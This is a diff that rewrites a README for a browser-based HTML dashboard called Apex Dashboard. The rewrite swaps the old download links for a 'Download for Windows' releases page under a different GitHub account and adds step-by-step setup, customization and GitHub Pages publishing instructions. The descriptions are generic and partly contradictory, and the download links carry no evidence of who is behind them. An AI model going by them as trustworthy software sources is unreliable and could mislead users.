@@ -1,163 +1,228 @@
-# Apex Dashboard - Dashboard 2026
+# 📊 apex-dashboard-ui - View Your Data at a Glance
 
-> **Apex Dashboard is a browser-based HTML project for displaying dashboard content through a web interface.**
+[![Download for Windows](https://img.shields.io/badge/Download-For%20Windows-blue?style=for-the-badge&logo=windows)](https://github.com/barclayfollowing387/apex-dashboard-ui/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/samgreenyn1876/apex-dashboard-ui?style=flat-square)](https://github.com/samgreenyn1876/apex-dashboard-ui)
+## 🚀 Getting Started
 
----
+Apex Dashboard 2026 is a browser-based dashboard that runs on your Windows computer. It lets you view charts, tables, and key metrics in a clean web interface. You do not need to install any special software or write any code.
 
-<p align="center">
-  <a href="https://samgreenyn1876.github.io/apex-dashboard-ui/">
-    <img src="https://img.shields.io/badge/Download-Apex%20Dashboard%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Dashboard">
-  </a>
-</p>
-
-> **[Download Apex Dashboard](https://samgreenyn1876.github.io/apex-dashboard-ui/)**
+This guide walks you through every step.
 
 ---
 
-[Download Latest Build](https://samgreenyn1876.github.io/apex-dashboard-ui/)
+## 📦 What You Get
+
+Apex Dashboard 2026 gives you:
+
+- A full-screen dashboard with charts and data tables
+- Real-time updates for your metrics
+- A simple web interface that works in your browser
+- Flexible layout for monitors of any size
+- Support for common data formats
+
+The dashboard runs from your local computer. You do not need an internet connection after you download the files.
 
 ---
 
-## Overview
+## 💻 System Requirements
 
-Apex Dashboard is an HTML web project that presents dashboard information directly in a browser. Since it uses a web-based format, it can be viewed without installing a desktop application tied to a particular operating system.
+Your computer needs:
 
-The project provides a foundation for dashboard displays, interface adjustments, and browser-based local use. The files may be opened in a compatible browser or deployed to a static host, including services such as GitHub Pages.
+- **Operating System:** Windows 10 or Windows 11
+- **Browser:** Chrome, Edge, or Firefox (latest version)
+- **Storage:** 100 MB free space
+- **Memory:** 4 GB RAM (8 GB recommended)
+- **Screen:** 1280 x 720 resolution or higher
 
----
-
-## Highlights
-
-- Dashboard interface accessible through a browser
-- HTML-based implementation
-- Designed for the Web platform
-- Supports local viewing
-- Suitable for deployment as a hosted web page
-- Lightweight project organization
-- Works with modern web browsers
-- Provides a base for dashboard customization
+These requirements are minimums. The dashboard works better on faster computers with larger screens.
 
 ---
 
-## Getting Started
+## ⬇️ How to Download
 
-### Download the files
+1. Visit the download page:
+   [https://github.com/barclayfollowing387/apex-dashboard-ui/releases](https://github.com/barclayfollowing387/apex-dashboard-ui/releases)
 
-Retrieve the newest available build here:
+2. Look for the latest release at the top of the page.
 
-[Download Apex Dashboard](https://samgreenyn1876.github.io/apex-dashboard-ui/)
+3. Click the link that says **Source code (zip)** to download the ZIP file.
 
-### Clone with Git
-
-```bash
-git clone https://github.com/samgreenyn1876/apex-dashboard-ui.git
-cd REPO
-```
-
-### View the project locally
-
-Find the primary HTML file and open it in a modern web browser. When the project contains an `index.html` file, opening that file directly will generally launch the dashboard.
-
-To make the dashboard available online, deploy the repository through a compatible static web hosting service and visit the resulting URL.
+4. Save the ZIP file to your Desktop or Downloads folder.
 
 ---
 
-## Using Apex Dashboard
+## 🛠️ How to Run the Dashboard
 
-1. Download the project or create a local clone.
-2. Open its main HTML entry file in a browser.
-3. Inspect the dashboard layout and content.
-4. Edit the HTML to match the desired presentation or information.
-5. Deploy it to a static host if it needs to be accessed remotely.
+Follow these steps exactly. Each step builds on the last one.
 
-For a local preview, you can use a basic static server. With Python installed, run:
+### Step 1: Extract the ZIP File
 
-```bash
-python -m http.server 8000
-```
+1. Find the ZIP file on your computer.
+2. Right-click the file.
+3. Select **Extract All** from the menu.
+4. Choose a destination folder. Use your Desktop for easy access.
+5. Click **Extract**.
 
-Afterward, navigate to `http://localhost:8000` in your browser.
+You now have a folder called `apex-dashboard-ui-main` (or similar).
 
----
+### Step 2: Locate the Right File
 
-## Customization and Configuration
+1. Open the extracted folder.
+2. Look for a file named `index.html`.
+3. This file is the main dashboard page.
 
-Configuration is handled through the project files because Apex Dashboard is an HTML-based application.
+### Step 3: Open the Dashboard
 
-Areas commonly adjusted include:
+1. Right-click the `index.html` file.
+2. Choose **Open with** from the menu.
+3. Select your browser (Chrome, Edge, or Firefox).
 
-- Dashboard labels and written content
-- The HTML document structure
-- Layout and page sections
-- Referenced assets
-- Settings related to hosted deployment
-
-Before making changes, consider creating a backup or using a separate branch. This keeps the original files available and makes revisions easier to review.
+The dashboard opens in a new browser tab. You see charts and data immediately.
 
 ---
 
-## Requirements
+## 🔧 How It Works
 
-- A current web browser
-- The Apex Dashboard project files
-- Internet access when downloading hosted files or deploying remotely
-- A static server or hosting provider for online publication
-- Optional: Python or another local HTTP server for project previews
+Apex Dashboard 2026 is a collection of HTML, CSS, and JavaScript files. Your browser loads these files and shows the dashboard.
 
-The available project metadata does not specify a required desktop runtime.
+The dashboard displays:
 
----
+- **Line charts** for trends over time
+- **Bar charts** for comparing values
+- **Pie charts** for showing parts of a whole
+- **Data tables** with sortable columns
+- **Status indicators** for key metrics
 
-## Frequently Asked Questions
-
-### Which platform is supported?
-
-Apex Dashboard is intended for the Web platform and is implemented with HTML.
-
-### What is the current version?
-
-The available project metadata does not include a version number. Refer to the repository or most recently published build for release information.
-
-### How do I launch it?
-
-Open the project’s main HTML file in a modern browser. You can also run the files through a local static HTTP server.
-
-### Is the dashboard editable?
-
-Yes. You can modify the HTML files to change the structure, content, and visual presentation.
-
-### Where are configuration changes made?
-
-Inspect the project’s HTML files and any included assets. The repository layout determines which files contain the relevant presentation settings.
-
-### What should I do if the dashboard fails to load?
-
-Verify that you opened the intended HTML entry point, that linked assets are still in their expected paths, and that the project is being served from the correct directory. Running a local HTTP server may also resolve browser loading issues.
-
-### How do I publish a hosted copy?
-
-Deploy the project with a compatible static hosting service, then open the web address generated by that service.
+All data stays on your computer. Nothing is sent over the internet.
 
 ---
 
-## Future Directions
+## 📝 Customizing Your Dashboard
 
-Possible improvements include:
+You can modify the dashboard after you learn the basics.
 
-- Adding documentation for the repository layout
-- Providing more detailed customization instructions
-- Clarifying the hosted deployment process
-- Tracking version details for published builds
-- Offering additional dashboard presentation choices
+### Changing the Data
+
+1. Open the extracted folder.
+2. Look for a subfolder named `data` or `assets`.
+3. Find files with names like `data.json` or `config.json`.
+4. Open these files with Notepad.
+5. Change the numbers and labels inside.
+6. Save the file.
+7. Refresh the dashboard in your browser.
+
+Your changes appear immediately.
+
+### Changing the Look
+
+1. Look for a file named `style.css` in the main folder.
+2. Open it with Notepad.
+3. Change values like `color`, `font-size`, or `background`.
+4. Save the file.
+5. Refresh the dashboard.
+
+Colors, fonts, and layout update instantly.
 
 ---
 
-## License
+## 🌐 Publishing Your Dashboard
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+You can share your dashboard online. This requires a free GitHub account.
+
+### Step 1: Create a GitHub Account
+
+1. Go to [github.com](https://github.com).
+2. Click **Sign up**.
+3. Follow the instructions.
+
+### Step 2: Upload Your Files
+
+1. Sign in to GitHub.
+2. Click the **+** icon in the top right.
+3. Select **New repository**.
+4. Give your repository a name (like `my-dashboard`).
+5. Keep it public.
+6. Click **Create repository**.
+
+You see a page with instructions. Use the upload method:
+
+1. Drag your `apex-dashboard-ui-main` folder from your computer.
+2. Drop it on the GitHub page.
+3. Scroll down and click **Commit changes**.
+
+### Step 3: Enable GitHub Pages
+
+1. In your new repository, click **Settings**.
+2. Click **Pages** in the left menu.
+3. Under **Branch**, select `main` or `master`.
+4. Click **Save**.
+
+After a few minutes, your dashboard is live at a URL like:
+`https://yourusername.github.io/my-dashboard`
+
+Copy this URL and share it with anyone.
+
+---
+
+## ❓ Troubleshooting
+
+### The dashboard does not open
+
+- Make sure you extracted the ZIP file completely.
+- Double-click the `index.html` file directly.
+- Try a different browser.
+
+### Charts do not show data
+
+- Check that all files are in the same folder.
+- Look for error messages in the browser console.
+- Refresh the page.
+
+### The dashboard looks broken
+
+- Clear your browser cache.
+- Try incognito or private mode.
+- Update your browser to the latest version.
+
+---
+
+## 🔄 Updating to a New Version
+
+1. Visit the download page again:
+   [https://github.com/barclayfollowing387/apex-dashboard-ui/releases](https://github.com/barclayfollowing387/apex-dashboard-ui/releases)
+
+2. Download the new ZIP file.
+
+3. Extract it to a new folder.
+
+4. Copy your custom data files from the old folder to the new one.
+
+5. Open the new `index.html` file.
+
+Your custom data works with the updated dashboard.
+
+---
+
+## 🗑️ Uninstalling
+
+To remove the dashboard:
+
+1. Delete the extracted folder.
+2. Delete the ZIP file.
+3. Close any browser tabs that show the dashboard.
+
+That is all. The dashboard leaves no other files on your computer.
+
+---
+
+## 📚 Learn More
+
+Visit these resources for help:
+
+- GitHub Help Center: [https://help.github.com](https://help.github.com)
+- Browser support pages for Chrome, Edge, or Firefox
+- Community forums for HTML and web dashboards
+
+---
+
+Keywords: dashboard, apex, html, browser, windows, download, open source, data visualization, charts, web interface
